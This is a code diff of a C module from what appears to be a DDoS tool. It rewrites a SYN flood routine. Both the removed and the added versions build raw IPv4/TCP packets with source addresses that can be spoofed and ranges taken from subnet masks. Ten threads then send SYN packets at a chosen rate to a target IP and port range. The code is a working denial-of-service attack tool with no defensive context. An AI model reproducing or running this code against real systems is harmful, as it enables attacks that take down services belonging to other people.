@@ -1,261 +1,143 @@
 #include "../header.h"
 #include "../base/make_ipv4.h"
 #include "../base/make_tcp.h"
-#include "../ddos/syn_flood.h"
 #include "../base/subnet_mask.h"
-
-unsigned int tcpsyn_total;
-unsigned int tcpsyn_produced;
-
-unsigned int tcpsyn_per_second;
-
-char tcpsyn_dest_ip[16];
-char tcpsyn_src_ip[16];
-
-int tcpsyn_src_ip_mask;
-int tcpsyn_dest_ip_mask;
-
-char tcpsyn_now_src_ip[16];
-char tcpsyn_now_dest_ip[16];
-
-int tcpsyn_dest_port;
-
-pthread_mutex_t tcpsyn_mutex = PTHREAD_MUTEX_INITIALIZER;
-pthread_cond_t tcpsyn_cond = PTHREAD_COND_INITIALIZER;
-
-struct timespec tcpsyn_time1, tcpsyn_time2;
-
-void syn_flood_print_usage(int mode) {
-
-	if (mode == 2)
-		printf(
-				"SYN flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
-}
-
-void* generate_syn_request1(void *data) {
-	int thread_id = *((int*) data);
-	int sock = make_socket(IPPROTO_TCP);
-	while (1) {
-
-		struct iphdr ipv4_h;
-		ipv4_h = prepare_empty_ipv4();
-		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));
-
-		/*** If you want to modify ip address*/
-		//next_ip_addr(tcpsyn_src_ip, 1);
-		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));
-
-		struct tcphdr tcp_h;
-		tcp_h = prepare_empty_tcp();
-		//Lucky 7777 SRC PORT NUMBER;
-		tcp_h = tcp_set_source(tcp_h, 7777);
-		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
-		tcp_h = tcp_set_seq(tcp_h, tcpsyn_produced);
-
-		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
-		/***For SYN TCP request, ACK seq should not be provided.*/
-
-		tcp_h = tcp_set_syn_flag(tcp_h);
-
-		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, NULL, 0);
-
-		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
-		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
-
-		//printf("%d\n", ((struct iphdr*) packet)->tot_len);
-
-		pthread_mutex_lock(&tcpsyn_mutex);
-
-		if (tcpsyn_produced >= tcpsyn_total) {
-			pthread_mutex_unlock(&tcpsyn_mutex);
-			pthread_cond_broadcast(&tcpsyn_cond);
-			return 0;
-		}
-
-		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
-		free(packet);
-		tcpsyn_produced++;
-
-		pthread_mutex_unlock(&tcpsyn_mutex);
-	}
-	close(sock);
-	return 0;
-}
-
-void* generate_syn_request2(void *data) {
-	int thread_id = *((int*) data);
-	int sock = make_socket(IPPROTO_TCP);
-	clock_t thread_clock;
-
-	while (1) {
-		//make pseudo ip header.
-		struct iphdr ipv4_h;
-		ipv4_h = prepare_empty_ipv4();
-		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));
-		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));
-
-		//modify tcpsyn_src_ip, increment 1.
-		//next_ip_addr(tcpsyn_src_ip, 1);
-
-		//make pseudo tcp header.
-		struct tcphdr tcp_h;
-		tcp_h = prepare_empty_tcp();
-		//set src port number random assigned 7777
-
-		tcp_h = tcp_set_source(tcp_h, 7777);
-		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
-		tcp_h = tcp_set_seq(tcp_h, tcpsyn_total);
-
-		/***For SYN TCP request, ACK seq should not be provided.***/
-		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
-
-		tcp_h = tcp_set_syn_flag(tcp_h);
-
-		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, NULL, 0);
-
-		//modify ipv4 after tcp part is added.
-		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
-		//assemble ip part with tcp part.
-		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
-
-		pthread_mutex_lock(&tcpsyn_mutex);
-
-		//Conditions begin.
-		if (tcpsyn_produced >= tcpsyn_per_second) {
-			pthread_cond_wait(&tcpsyn_cond, &tcpsyn_mutex);
-		}
-
-		//Get Time
-		clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time2);
-		double tcpsyn_elapsed_time = (tcpsyn_time2.tv_sec - tcpsyn_time1.tv_sec)
-				+ ((tcpsyn_time2.tv_nsec - tcpsyn_time1.tv_nsec) / 1000000000.0);
-
-		//If time > 1.0
-		if (tcpsyn_elapsed_time >= 1.0) {
-
-		//	printf("-.\n");
-			tcpsyn_produced = 0;
-
-			clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time1);
-			pthread_cond_signal(&tcpsyn_cond);
-		}
-
-		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
-		free(packet);
-
-		tcpsyn_produced++;
-	//	printf("%d syn packet sent\n",tcpsyn_produced);
-
-		tcpsyn_total++;
-
-		pthread_mutex_unlock(&tcpsyn_mutex);
-	}
-	close(sock);
-	return 0;
-}
-
-void* syn_time_check(void *data) {
-	while (1) {
-
-		pthread_mutex_lock(&tcpsyn_mutex);
-
-		//Get Time
-		clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time2);
-		double tcpsyn_elapsed_time = (tcpsyn_time2.tv_sec - tcpsyn_time1.tv_sec)
-				+ ((tcpsyn_time2.tv_nsec - tcpsyn_time1.tv_nsec) / 1000000000.0);
-
-		//If time > 1.0
-		if (tcpsyn_elapsed_time >= 1.0) {
-		//	printf("-.\n");
-			tcpsyn_produced = 0;
-			clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time1);
-			pthread_cond_signal(&tcpsyn_cond);
-		}
-
-		pthread_mutex_unlock(&tcpsyn_mutex);
-	}
-}
-
-void syn_flood_run(char *argv[], int mode) {
-
-	int argc = 0;
-	tcpsyn_produced = 0;
-
-	while (argv[argc] != NULL) {
-		argc++;
-	}
-
-	if (mode == 2 && argc != 4) {
-		syn_flood_print_usage(mode);
-		return;
-	}
-
-	get_ip_from_ip_addr(argv[0], tcpsyn_src_ip);
-	tcpsyn_src_ip_mask = get_mask_from_ip_addr(argv[0]);
-	strcpy(tcpsyn_now_src_ip, tcpsyn_src_ip);
-
-	get_ip_from_ip_addr(argv[1], tcpsyn_dest_ip);
-	tcpsyn_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
-	strcpy(tcpsyn_now_dest_ip, tcpsyn_dest_ip);
-
-	if (mode == 2) {
-		tcpsyn_total = 0;
-		tcpsyn_per_second = atoi(argv[3]);
-
-		if (tcpsyn_per_second == 0)
-			tcpsyn_per_second = __UINT_MAXIMUM__;
-
-		tcpsyn_dest_port = atoi(argv[2]);
-	}
-
-	int num_threads = 10;
-
-	int *generate_thread_id;
-	pthread_t *generate_thread;
-
-	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
-	generate_thread = (pthread_t*) malloc(
-			sizeof(pthread_t) * (num_threads + 1));
-	int i;
-
-	printf("Sending SYN requests to %s using %d threads\n", tcpsyn_dest_ip,
-			num_threads);
-	for (i = 0; i < num_threads; i++)
-		generate_thread_id[i] = i;
-
-	clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time1);
-
-	for (i = 0; i < num_threads; i++) {
-		if (mode == 1)
-			pthread_create(&generate_thread[i], NULL, generate_syn_request1,
-					(void*) &generate_thread_id[i]);
-		if (mode == 2)
-			pthread_create(&generate_thread[i], NULL, generate_syn_request2,
-					(void*) &generate_thread_id[i]);
-	}
-
-	if (mode == 2) {
-		pthread_create(&generate_thread[i], NULL, syn_time_check,
-				(void*) &generate_thread_id[i]);
-		num_threads++;
-	}
-
-	for (i = 0; i < num_threads+1; i++) {
-		void *status;
-		pthread_join(generate_thread[i], &status);
-		printf("thread %d joined\n", i);
-	}
-
-	printf("SYN flood finished\nTotal %d packets sent.\n",
-			tcpsyn_total);
-
-	pthread_mutex_destroy(&tcpsyn_mutex);
-	pthread_exit(NULL);
-
-	free(generate_thread_id);
-	free(generate_thread);
+#include "../base/time_check.h"
+#include "../ddos/syn_flood.h"
+
+// session counting
+unsigned int g_syn_num_total;
+unsigned long g_syn_num_generated_in_sec;
+// from main()
+char g_syn_dest_ip[16];
+char g_syn_src_ip[16];
+unsigned int g_syn_src_mask;
+unsigned int g_syn_dest_mask;
+unsigned int g_syn_dest_port_start;
+unsigned int g_syn_dest_port_end;
+unsigned int g_syn_request_per_sec;
+// for masking next ip address
+char g_syn_now_src_ip[16];
+char g_syn_now_dest_ip[16];
+unsigned int g_syn_now_dest_port;
+// thread
+pthread_mutex_t g_syn_mutex = PTHREAD_MUTEX_INITIALIZER;
+pthread_cond_t g_syn_cond = PTHREAD_COND_INITIALIZER;
+// time checking
+struct timespec g_syn_before_time;
+struct timespec g_syn_now_time;
+
+void syn_flood_print_usage(void)
+{
+	printf("SYN flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
 	return;
 }
 
+void *generate_syn_flood(void *data)
+{
+	int thread_id = *((int*) data);
+	int sock = make_socket(IPPROTO_TCP);
+	clock_t thread_clock;
+	while (1) {
+		// *** begin of critical section ***
+		pthread_mutex_lock(&g_syn_mutex);
+		// get now resource
+		generator(g_syn_src_ip,
+			g_syn_dest_ip,
+			g_syn_src_mask,
+			g_syn_dest_mask,
+			g_syn_dest_port_start,
+			g_syn_dest_port_end,
+			g_syn_now_src_ip,
+			g_syn_now_dest_ip,
+			&g_syn_now_dest_port);
+		// make ipv4 header
+		struct iphdr ipv4_h;
+		ipv4_h = prepare_empty_ipv4();
+		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
+		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(g_syn_src_ip));
+		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(g_syn_dest_ip));
+		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct tcphdr));
+		// make tcp header.
+		struct tcphdr tcp_h;
+		tcp_h = prepare_empty_tcp();
+		// set src port number random assigned 7777
+		tcp_h = tcp_set_source(tcp_h, 7777);
+		tcp_h = tcp_set_dest(tcp_h, g_syn_now_dest_port);
+		tcp_h = tcp_set_seq(tcp_h, g_syn_num_total);
+		// ***For SYN TCP request, ACK seq should not be provided
+		// tcp_h = tcp_set_ack_seq(tcp_h,35623);
+		tcp_h = tcp_set_syn_flag(tcp_h);
+		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, NULL, 0);
+		// wait a second
+		if (g_syn_num_generated_in_sec >= g_syn_request_per_sec) {
+			pthread_cond_wait(&g_syn_cond, &g_syn_mutex);
+		}
+		// time checking
+		time_check(&g_syn_mutex, &g_syn_cond, &g_syn_before_time, &g_syn_now_time, &g_syn_num_generated_in_sec);
+		// make and send packet
+		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
+		send_packet(sock, ipv4_h, packet, g_syn_now_dest_port);
+		free(packet);
+		g_syn_num_generated_in_sec++;
+		g_syn_num_total++;
+		// *** end of critical section ***
+		pthread_mutex_unlock(&g_syn_mutex);
+	}
+	close(sock);
+	return 0;
+}
+
+void *syn_flood_time_check(void *data)
+{
+	while (1) {
+		pthread_mutex_lock(&g_syn_mutex);
+		time_check(&g_syn_mutex, &g_syn_cond, &g_syn_before_time, &g_syn_now_time, &g_syn_num_generated_in_sec);
+		pthread_mutex_unlock(&g_syn_mutex);
+	}
+}
+
+void syn_flood_main(char *argv[])
+{
+	int argc = 0;
+	while (argv[argc] != NULL) {
+		argc++;
+	}
+	if (argc != 4) {
+		syn_flood_print_usage();
+		return;
+	}
+	// get ip address, mask, port
+	split_ip_mask_port(argv,
+			g_syn_src_ip,
+			g_syn_dest_ip,
+			&g_syn_src_mask,
+			&g_syn_dest_mask,
+			&g_syn_dest_port_start,
+			&g_syn_dest_port_end);
+	g_syn_num_generated_in_sec = 0;
+	g_syn_num_total = 0;
+	memset(&g_syn_before_time, 0, sizeof(struct timespec));
+	memset(&g_syn_now_time, 0, sizeof(struct timespec));
+	g_syn_request_per_sec = atoi(argv[3]);
+	const int num_threads = 10;
+	pthread_t threads[9999];
+	int thread_ids[9999];
+	for (int i = 0; i < num_threads; i++) {
+		thread_ids[i] = i;
+	}
+	printf("Sending SYN requests to %s using %d threads\n", g_syn_dest_ip, num_threads);
+	int i;
+	for (i = 0; i < num_threads; i++) {
+		pthread_create(&threads[i], NULL, generate_syn_flood, (void *)&thread_ids[i]);
+	}
+	pthread_create(&threads[i], NULL, syn_flood_time_check, NULL);
+	for (int i = 0; i < num_threads; i++) {
+		pthread_join(threads[i], NULL);
+		printf("thread %d joined\n", i);
+	}
+	pthread_mutex_destroy(&g_syn_mutex);
+	printf("SYN flood finished\nTotal %d packets sent.\n", g_syn_num_total);
+	pthread_exit(NULL);
+	return;
+}
